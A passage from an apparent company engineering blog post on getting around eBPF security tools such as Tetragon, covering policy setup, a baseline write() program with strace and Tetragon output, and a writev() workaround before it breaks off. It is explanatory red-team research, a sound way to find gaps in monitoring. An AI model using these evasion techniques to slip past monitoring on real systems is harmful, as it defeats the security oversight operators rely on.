    </div></a> <!----></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/why-form3/insights" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Insights
      </h4></div> <div class="text-base">
      Get our latest insights into the world of payments
    </div></a> <!----></div></div></div></div></div></div></div></div></li><li class="group pr-5" data-v-3a38c3a0><div class="flex items-center relative z-10 cursor-pointer gap-2" data-v-3a38c3a0><a href="/payment-platform" class="pl-5 py-7 text-with-border relative whitespace-nowrap" data-v-3a38c3a0>
      Payment Platform
    </a> <div class="cursor-pointer flex-grow flex-shrink-0 basis-5" data-v-3a38c3a0><img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="transition-all ease-out" data-v-3a38c3a0></div></div> <div class="absolute left-0 z-40 w-full transition-all hidden border-t border-opacity-20 border-dark-navy" data-v-3a38c3a0><div class="bg-soft-white bg-opacity-70 text-dark-navy w-full h-full" data-v-3a38c3a0><div class="bg-soft-white border-b border-dark-navy border-opacity-20 pt-8 pb-8" data-v-3a38c3a0><div data-v-3a38c3a0><div class="container mx-auto max-w-screen-8xl xl:px-[38px] animate-slide-in-opacity-0-to-100" data-v-3a38c3a0><div><!----> <div class="grid grid-cols-4"><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/payment-platform" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Payment Platform
      </h4></div> <div class="text-base">
      Discover unconstrained innovation in the cloud
    </div></a> <!----></div></div></div><div><div class="divider my-16 mx-6 w-full"><img src="/_nuxt/img/menu-divider-dark.b09f30d.svg" alt="menu-divider-dark" class="inline-block"></div> <div class="grid grid-cols-3 xl:grid-cols-4"><div newline="true" class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/payment-platform/europe" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Europe
      </h4></div> <div class="text-base">
      Access the power of SEPA through a single API
    </div></a> <div class="flex flex-col"><a href="/payment-platform/europe/sepa-instant" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        SEPA Instant
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a><a href="/payment-platform/europe/sepa" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        SEPA
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a></div></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/payment-platform/us" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        US
      </h4></div> <div class="text-base">
      Access all ACH and Real-time payment schemes through a single API
    </div></a> <div class="flex flex-col"><a href="/payment-platform/us/us-instant" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        US Instant
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a><a href="/payment-platform/us/us" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        US
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a></div></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/payment-platform/uk" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        UK
      </h4></div> <div class="text-base">
      A single API integration point for all UK payment schemes
    </div></a> <div class="flex flex-col"><a href="/payment-platform/uk/uk-instant" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        UK Instant
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a><a href="/payment-platform/uk/uk" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        UK
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a><a href="/payment-platform/uk/cop" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        Confirmation of Payee
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a></div></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/payment-platform/international" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        International
      </h4></div> <div class="text-base">
      Removing borders with international payments and FX services
    </div></a> <div class="flex flex-col"><a href="/payment-platform/international/swift" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        SWIFT
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a><a href="/payment-platform/international/cross-currency" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        Cross Currency
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a></div></div></div></div></div></div></div></div></div></li><li data-v-3a38c3a0><div class="flex items-center relative z-10 cursor-pointer gap-2" data-v-3a38c3a0><a href="https://api-docs.form3.tech/" target="_blank" class="pl-5 py-7 text-with-border relative whitespace-nowrap" data-v-3a38c3a0>
      API Docs
    </a> <div class="cursor-pointer flex-grow flex-shrink-0 basis-5" data-v-3a38c3a0><!----></div></div> <!----></li><li class="group pr-5" data-v-3a38c3a0><div class="flex items-center relative z-10 cursor-pointer gap-2" data-v-3a38c3a0><a href="/engineering" class="pl-5 py-7 text-with-border relative whitespace-nowrap nuxt-link-active" data-v-3a38c3a0>
      Engineering
    </a> <div class="cursor-pointer flex-grow flex-shrink-0 basis-5" data-v-3a38c3a0><img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="transition-all ease-out" data-v-3a38c3a0></div></div> <div class="absolute left-0 z-40 w-full transition-all hidden border-t border-opacity-20 border-dark-navy" data-v-3a38c3a0><div class="bg-soft-white bg-opacity-70 text-dark-navy w-full h-full" data-v-3a38c3a0><div class="bg-soft-white border-b border-dark-navy border-opacity-20 pt-8 pb-8" data-v-3a38c3a0><div data-v-3a38c3a0><div class="container mx-auto max-w-screen-8xl xl:px-[38px] animate-slide-in-opacity-0-to-100" data-v-3a38c3a0><div><!----> <div class="grid grid-cols-4"><div alias="Engineering" class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/engineering" tabindex="0" class="p-6 rounded-lg transition-colors nuxt-link-active hover:bg-sky-blue"><div class="pb-4"><h4>
        Let's code together!
      </h4></div> <div class="text-base">
      All things engineering & technology
    </div></a> <!----></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/engineering/life-at-form3" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Lets work together!
      </h4></div> <div class="text-base">
      Read about life at Form3: our work, our teams and our culture
    </div></a> <!----></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/engineering/content" tabindex="0" class="p-6 rounded-lg transition-colors nuxt-link-active hover:bg-sky-blue"><div class="pb-4"><h4>
        Lets learn together!
      </h4></div> <div class="text-base">
      Catch up on all our latest blogs and events
    </div></a> <div class="flex flex-col"><a href="https://twitter.com/Form3Tech" target="_blank" tabindex="0" class="rounded-lg transition-colors px-6 py-3 hover:bg-sky-blue"><div class="flex content-start"><span class="group-secondary inline-flex content-center font-mulish font-bold cursor-pointer whitespace-nowrap">
        Twitter feed
       <img src="/_nuxt/img/arrow-right-dark.dba56c9.svg" alt="arrow-right-dark" class="transition-transform group-secondary-hover:translate-x-2 inline-block ml-2"></span></div></a></div></div></div></div></div></div></div></div></div></li><li class="group pr-5" data-v-3a38c3a0><div class="flex items-center relative z-10 cursor-pointer gap-2" data-v-3a38c3a0><a href="/careers" class="pl-5 py-7 text-with-border relative whitespace-nowrap" data-v-3a38c3a0>
      Careers
    </a> <div class="cursor-pointer flex-grow flex-shrink-0 basis-5" data-v-3a38c3a0><img src="/_nuxt/img/chevron-down-20px-dark.2c1d915.svg" alt="chevron-down-20px-dark" class="transition-all ease-out" data-v-3a38c3a0></div></div> <div class="absolute left-0 z-40 w-full transition-all hidden border-t border-opacity-20 border-dark-navy" data-v-3a38c3a0><div class="bg-soft-white bg-opacity-70 text-dark-navy w-full h-full" data-v-3a38c3a0><div class="bg-soft-white border-b border-dark-navy border-opacity-20 pt-8 pb-8" data-v-3a38c3a0><div data-v-3a38c3a0><div class="container mx-auto max-w-screen-8xl xl:px-[38px] animate-slide-in-opacity-0-to-100" data-v-3a38c3a0><div><!----> <div class="grid grid-cols-4"><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/careers" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Careers
      </h4></div> <div class="text-base">
      Join us and help shape the future of payments as we know it
    </div></a> <!----></div><div class="font-normal h-full flex flex-col justify-start col-span-1 pr-8"><a href="/careers/vacancies" tabindex="0" class="p-6 rounded-lg transition-colors hover:bg-sky-blue"><div class="pb-4"><h4>
        Vacancies
      </h4></div> <div class="text-base">
      Your once-in-a-lifetime career starts here
    </div></a> <!----></div></div></div></div></div></div></div></div></li> <li><a href="/contact"><button class="flex items-center group text-dark-navy font-mulish font-bold text-base rounded-full leading-snug px-6 py-3.75 active:opacity-80 ml-2 bg-teal text-dark-navy">
            Contact
           <!----></button></a></li></ul></div> <div class="absolute left-0 z-20 w-full h-screen bg-dark-navy bg-opacity-60 transform translate-y-1 hidden"></div></div> <div class="lg:hidden"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5 relative border-b border-dark-navy border-opacity-20 flex items-center justify-between w-full py-4 gap-2"><a href="/" class="animate-transition-in-0-to-100 flex-1 nuxt-link-active"><img src="/_nuxt/img/logo-dark.339ede7.svg" alt="logo-dark"></a> <!----> <!----> <!----> <a href="/contact"><button class="flex items-center group text-dark-navy font-mulish font-bold text-base rounded-full leading-snug px-6 py-3.75 active:opacity-80 bg-teal text-dark-navy">Contact <!----></button></a> <button data-v-7666961d><span data-v-7666961d></span> <span data-v-7666961d></span> <span data-v-7666961d></span> <span data-v-7666961d></span></button></div> <!----></div></header> <div class="flex-1 relative bg-soft-white text-dark-navy"><!----> <div data-fetch-key="PageFetch:0"><div class="relative"><div class="pb-[16px] lg:pb-[80px] pt-[64px] lg:pt-[104px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div><div class="lg:w-9/12 mb-14 lg:mb-24"><h2 class="text-size-h2-mobile md:text-size-h2-tablet lg:text-size-h2-desktop mb-6 md:mb-10 last:mb-0">Bypassing eBPF-based Security Enforcement Tools</h2></div> <div class="border-b border-current flex justify-between lg:justify-start mb-10 lg:mb-20 pb-4"><p class="font-roboto text-size-p-mobile lg:order-2 flex"><span class="capitalize">blogs</span><span class="mx-1 text-[30px]"></span> 8min
        </p> <p class="font-roboto text-size-p-mobile lg:w-4/12">
          June 6, 2022
        </p></div> <div class="ml-auto mr-0 lg:w-8/12"><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">During penetration tests and red team engagements, eBPF-based security observability and runtime enforcement tools can make it difficult to use public offensive security tools and techniques, as they are more often detected and blocked. </p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">However, eBPF-based tools have limitations which allow adversaries to bypass their controls. In this blog post, I will introduce some of the limitations and bypass techniques.</p></div></div></div></div> <div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">This post will cover:</h4></div> <div class="flex mb-6 last:mb-0"><div class="max-w-[40px] min-w-[40px] text-left font-bold"><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">01</p></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><a href="https://github.com/cilium/tetragon" class="text-azure no-underline hover:underline last:mb-0">Tetragon</a>: open-source eBPF-based security observability and runtime enforcement tool</p></div></div><div class="flex mb-6 last:mb-0"><div class="max-w-[40px] min-w-[40px] text-left font-bold"><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">02</p></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Policies limitations</p></div></div><div class="flex mb-6 last:mb-0"><div class="max-w-[40px] min-w-[40px] text-left font-bold"><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">03</p></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Bypassing I/O system call monitoring withio_uring</p></div></div><div class="flex mb-6 last:mb-0"><div class="max-w-[40px] min-w-[40px] text-left font-bold"><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">04</p></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Process execution context</p></div></div></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Tetragon</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Recently Isovalent released the Tetragon opensource project, an eBPF-based security observability and runtime enforcement platform that has been part of Isovalent Cilium Enterprise for a couple of years.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Open-sourcing parts of Isovalent Cilium Enterprise as project Tetragon and opening it up for the entire community inspired us at Form3 Offensive Security team to explore eBPF-based security observability and runtime enforcement tools capabilities and limitations.</p></div></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Setup</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">To get a hands-on experience with Tetragon and the generated events follow the Tetragon<a href="https://github.com/cilium/tetragon#quickstart-guide" class="text-azure no-underline hover:underline last:mb-0">quickstart-guide</a>to setup a Kind cluster and install Tetragon using a helm-based installation.</p></div></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Functionality Overview</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Tetragon uses kprobe hook points to observe arbitrary kernel calls in the Linux kernel, giving it the ability to monitor process opens, reads, writes, and closes throughout its lifecycle.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">To explore how Tetragon syscall monitoring works apply the<em>write.yaml</em>TracingPolicy.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>kubectl apply -f ./tetragon/crds/examples/write.yaml</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Create a testing pod using the<em>ubuntu</em>image.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>kubectl run demo --image ubuntu --command sleep infinity</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">In another terminal, start monitoring the events from the<em>demo</em>pod.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod demo</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">To test the TracingPolicy kubectl exec into the<em>demo</em>pod and read the contents of<em>/etc/hostname</em>.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>kubectl exec -it demo -- cat /etc/hostname </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The output in the terminal should be the hostname of the pod.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>demo</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Looking into the output in the terminal running<em>tetragon observe</em>we should see the<em>write</em>system call used by the<em>cat</em>command.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code> process default/demo /usr/bin/cat /etc/hostname                        
 write   default/demo /usr/bin/cat  5 bytes                             
 exit    default/demo /usr/bin/cat /etc/hostname 0             </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The output shows the <em>cat</em> process inside a Kubernetes workload performing a <em>write</em> system call with the contents of <em>/etc/hostname</em> to <em>stdout</em>, also known as standard output with the default file descriptor with the number <em>1</em>. Now that we have a baseline let's look into how to bypass this TracingPolicy.</p></div></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Thesys-writeTracingPolicy</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">This<a href="https://github.com/cilium/tetragon/blob/main/crds/examples/write.yaml" class="text-azure no-underline hover:underline last:mb-0">TracingPolicy</a>uses kprobe hook points, to observe arbitrary kernel system calls in the Linux kernel. We will look at the<em>sys-write</em>example TracingPolicy and see how it monitors detecting the write system calls.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The snippet below shows how the<em>__x64_sys_write</em>call is used in the TracingPolicy.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-yaml"><code>apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "sys-write"
spec:
  kprobes:
  - call: "__x64_sys_write"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "char_buf"
      sizeArgIndex: 3
    - index: 2
      type: "size_t"
    # follow any non-init pids stdout e.g. exec into container
    selectors:
    - matchPIDs:
      - operator: NotIn
        followForks: true
        isNamespacePID: true
        values:
        - 1
      matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "1"</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Baseline</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The first observation is that the effectiveness of the policy, as with most security monitoring tools, is directly related to the synchronous behaviour of the evaluated processes and system calls. To analyse this behaviour, we start by isolating the system call in a small C program and use it as a baseline.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><em>write(2)</em>function synopsis</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include &lt;unistd.h>

ssize_t write(int fd, const void *buf, size_t count);</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">The<a href="https://man7.org/linux/man-pages/man2/write.2.html" class="text-azure no-underline hover:underline last:mb-0">write(2)</a>system call is used to write to a file descriptor, in our baseline example the file descriptor is standard output with the file descriptor number1.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Baseline</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include &lt;unistd.h>

int main()
{
    write(1,"Writing using write()!\n",24); 
}</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Executing the program with<em>strace</em>allows us to observe the system calls.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ strace ./write
execve("./write", ["./write"], 0x7ffce310ca50 /* 24 vars */) = 0
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe797eb220) = -1 EINVAL (Invalid argument)
brk(NULL)                               = 0x175c000
brk(0x175d1c0)                          = 0x175d1c0
arch_prctl(ARCH_SET_FS, 0x175c880)      = 0
uname({sysname="Linux", nodename="lab", ...}) = 0
readlink("/proc/self/exe", "/home/ubuntu/write", 4096) = 18
brk(0x177e1c0)                          = 0x177e1c0
brk(0x177f000)                          = 0x177f000
mprotect(0x4bd000, 12288, PROT_READ)    = 0
write(1, "Writing using write()!\n\0", 24Writing using write()!
) = 24
exit_group(0)                           = ?
+++ exited with 0 +++</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">From the output, we verify how the<em>write(2)</em>system call is detected using the kprobe hook.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>write(1, "Writing using write()!\n\0", 24) = 24</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Executing the program in the<em>demo</em>pod confirms that our baseline works as intended.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl exec -it demo -- write
Writing using write()!</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">From the output, we can see that Tetragon can detect the<em>write(2)</em>system call.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe --namespace default --pod demo
 process default/demo /usr/bin/write                                    
 write   default/demo /usr/bin/write  24 bytes                          
 exit    default/demo /usr/bin/write  0                        </code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><div class="mb-8"><h4 class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0"><span class="text-size-h4-mobile md:text-size-h4-tablet lg:text-size-h4-desktop mb-8 last:mb-0">Limitations</span></h4></div> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Obviously, the simplest way to bypass the example rule is to use a function equivalent to<em>write()</em>like<em>writev()</em>for example, which performs the same action as<em>write()</em>, but gathers the output data from the iovcnt buffers specified by the members of the iov array.</p><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0"><em>writev()</em></p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>#include &lt;sys/uio.h>

int main()
{
    struct iovec vecs;
    vecs.iov_base = "Writing using writev()!\n";
    vecs.iov_len = 25;

    writev(1, &vecs, 1);
}</code></pre></div></div></div><div class="py-[24px]"><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="ml-auto mr-0 lg:w-8/12"><!----> <div><p class="font-roboto text-size-p-mobile mb-5.5 last:mb-0">Executing the program with<em>strace</em>to verify what system calls are called.</p></div></div></div></div><div class="container mx-auto max-w-screen-8xl px-6 xl:px-14.5"><div class="py-[24px]"><div class="md:max-h-[600px] overflow-auto shadow-xl rounded-lg p-4 bg-dark-navy lg:w-full"><pre class="!bg-dark-navy !m-0 !py-0 !h-full line-numbers language-go"><code>$ strace ./writev 
execve("./writev", ["./writev"], 0x7ffc915e7460 /* 24 vars */) = 0
